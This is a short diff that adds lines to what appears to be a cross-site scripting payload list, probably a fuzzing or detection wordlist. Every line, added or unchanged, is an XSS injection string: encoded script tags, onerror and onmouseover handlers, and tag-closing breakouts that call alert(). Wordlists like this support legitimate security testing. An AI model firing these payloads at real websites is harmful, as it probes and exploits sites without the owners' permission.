@@ -37,3 +37,8 @@ xyz%0a%0a<script>alert(7738);</script>abc.jsp
 \"></script><script>alert(12345);</script>
 %22/%3E%3CSCRIPT%3Ealert%28%22XSSTest%22%29%3C/SCRIPT%3E%3C%22
 %22%3E%3Cscript%3Ealert%28%22UberXSSTestString%22%29;%3C/script%3E
+<img src=0 onerror=alert(1) />
+fizzy%22/%3E%3Cscript%3Ealert(%20%22XSSPOSED%22);%3C/script%3E%3Ca%20href=%22&dateRange=all
+%2d%2d%3e%3c%2fdiv%3e%3c%2fform%3e%3c%2fdiv%3e%3c%2fdiv%3e%3c%2fdiv%3e%3c%2fdiv%3e%3c%2fdiv%3e%3c%2fdiv%3e%3cscript%3ealert%28%22XSSPOSED%22%29%3b%3c%2fscript%3e%3c%2fbody%3e%3c%21%2d%2d
+<h1 onmouseover=alert(document.domain)>
+%22;alert(%22XSSPOSED%22);
